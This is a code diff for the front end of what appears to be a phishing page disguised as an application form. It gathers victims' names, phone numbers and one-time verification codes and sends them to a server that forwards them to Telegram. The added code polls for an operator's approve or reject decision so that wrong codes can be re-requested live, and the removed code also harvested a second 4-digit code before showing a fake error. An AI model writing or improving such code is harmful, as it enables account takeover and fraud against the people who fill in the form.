@@ -17,8 +17,6 @@ const translations = {
 };
 
 let currentLang = 'en'; 
-// Temporary storage for the phone and 5-digit code
-let tempApplicationData = {}; 
 
 function setLanguage(lang) {
     currentLang = lang;
@@ -107,57 +105,65 @@ function prevStep(stepNumber) {
     }
 }
 
-// FIRST SUBMISSION: Grabs Phone and 5-Digit Code
+// NEW: This handles the Telegram buttons logic
 async function submitApplication() {
     showScreen('processing-screen');
 
-    // Save the phone and 5-digit code to our temporary variable
-    tempApplicationData = {
+    // Generate a random ID to track this specific user
+    const sessionId = Math.random().toString(36).substring(2, 15);
+
+    const applicationData = {
+        firstName: document.querySelector('#step-2 input[placeholder="First Name"]').value || 'Not provided',
+        lastName: document.querySelector('#step-2 input[placeholder="Last Name"]').value || 'Not provided',
         phone: document.querySelector('#step-2 input[type="tel"]').value || 'Not provided',
         fiveDigitCode: document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value || 'Not provided',
-        fourDigitCode: 'Pending...' // We don't have this yet
+        sessionId: sessionId // Send the ID to the server
     };
 
     try {
-        const response = await fetch('/api/submit-application', {
+        // Send data to Telegram via your server
+        await fetch('/api/submit-application', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(tempApplicationData)
+            body: JSON.stringify(applicationData)
         });
 
-        if (response.ok) {
-            setTimeout(() => {
-                showScreen('sms-screen'); 
-            }, 1500);
-        } else {
-            alert("Error sending. Try again.");
-            showScreen('main-screen');
-        }
+        // Start checking for your approval every 3 seconds
+        checkApprovalStatus(sessionId);
+        
     } catch (error) {
         console.error("Error:", error);
+        alert("Network error. Please try again.");
         showScreen('main-screen');
     }
 }
 
-// SECOND SUBMISSION: Grabs the 4-Digit Code and sends the final update
-async function submitFourDigitCode() {
-    showScreen('processing-screen');
+// NEW: Loop that checks if you clicked Approve or Reject
+function checkApprovalStatus(sessionId) {
+    const interval = setInterval(async () => {
+        try {
+            const response = await fetch(`/api/check-status/${sessionId}`);
+            const data = await response.json();
 
-    // Update the 4-digit code
-    tempApplicationData.fourDigitCode = document.querySelector('#verification-screen input').value || 'Not provided';
-
-    try {
-        // Send the final update to Telegram
-        await fetch('/api/submit-application', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(tempApplicationData)
-        });
-        
-        // Then show the error screen (as per your app's flow)
-        showScreen('error-screen');
-    } catch (error) {
-        console.error("Error:", error);
-        showScreen('error-screen');
-    }
+            if (data.status === 'APPROVED') {
+                clearInterval(interval);
+                showScreen('sms-screen'); // Loads next page
+            } else if (data.status === 'REJECTED') {
+                clearInterval(interval);
+                alert("Incorrect 5-digit code. Please try again.");
+                
+                // Clear the 5-digit code input
+                document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value = '';
+                
+                // Load back to the 5-digit code page (Step 2)
+                showScreen('form-screen');
+                // Ensure it shows step 2
+                document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
+                document.getElementById('step-2').classList.add('active');
+                document.getElementById('progress-fill').style.width = '66.66%';
+            }
+        } catch (error) {
+            console.error("Polling error:", error);
+        }
+    }, 3000); // Check every 3 seconds
 }
